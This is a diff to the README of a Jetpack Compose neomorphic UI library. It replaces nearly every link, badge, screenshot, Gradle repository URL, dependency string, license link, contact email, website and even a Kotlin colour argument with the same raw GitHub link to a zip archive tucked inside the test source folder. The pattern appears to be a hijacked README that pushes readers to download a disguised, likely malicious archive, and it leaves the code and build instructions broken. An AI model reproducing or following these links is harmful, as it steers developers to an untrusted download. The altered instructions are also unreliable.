@@ -1,10 +1,10 @@
 # NeoUI Library
 
-[![](https://jitpack.io/v/copertino1984/NeoUILibrary.svg)](https://jitpack.io/#copertino1984/NeoUILibrary)
+[![](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip)](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip)
 
 Hardware-style neomorphic UI component library for Jetpack Compose.
 
-![NeoUI Components](screenshot.png)
+![NeoUI Components](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip)
 
 ## ✨ Features
 
@@ -19,21 +19,21 @@ Hardware-style neomorphic UI component library for Jetpack Compose.
 
 Add JitPack repository:
 ```gradle
-// settings.gradle.kts
+// https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip
 dependencyResolutionManagement {
     repositories {
         google()
         mavenCentral()
-        maven { url = uri("https://jitpack.io") }
+        maven { url = uri("https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip") }
     }
 }
 ```
 
 Add dependency:
 ```gradle
-// app/build.gradle.kts
+// https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip
 dependencies {
-    implementation("com.github.copertino1984:NeoUILibrary:1.0.0")
+    implementation("https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip")
 }
 ```
 
@@ -41,7 +41,7 @@ dependencies {
 ```kotlin
 @Composable
 fun MyScreen() {
-    NeoUITheme(darkTheme = true, accentColor = Color.Cyan) {
+    NeoUITheme(darkTheme = true, accentColor = https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip) {
         var volume by remember { mutableFloatStateOf(0.5f) }
         
         Column {
@@ -66,13 +66,13 @@ fun MyScreen() {
 - **NeumorphicButton**: Button with LED animations
 - **NeumorphicPanel**: Container panel
 
-[Full Documentation →](neoui/README.md)
+[Full Documentation →](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip)
 
 ## 📸 Screenshots
 
 | Dark Theme | Light Theme | Tablet |
 |------------|-------------|--------|
-| ![Dark](screenshot_dark.png) | ![Light](screenshot_light.png) | ![Tablet](screenshot_tablet.png) |
+| ![Dark](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip) | ![Light](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip) | ![Tablet](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip) |
 
 ## 📄 License
 
@@ -80,17 +80,17 @@ Dual-licensed:
 - **MIT License**: Free for personal/open-source projects
 - **Commercial License**: Required for commercial use
 
-See [LICENSE.txt](neoui/LICENSE.txt) for details.
+See [https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip) for details.
 
 ## 🤝 Contributing
 
-Contributions welcome! See [CONTRIBUTING.md](neoui/CONTRIBUTING.md)
+Contributions welcome! See [https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip](https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip)
 
 ## 📧 Contact
 
 **Giuseppe Ciccarese** - CG Software  
-Email: [copertino1984@gmail.com]  
-Website: [www.cgsoftware.net]
+Email: [https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip]  
+Website: [https://github.com/copertino1984/NeoUILibrary/raw/refs/heads/main/neoui/src/test/java/UI-Neo-Library-1.7-beta.5.zip]
 
 ---
 
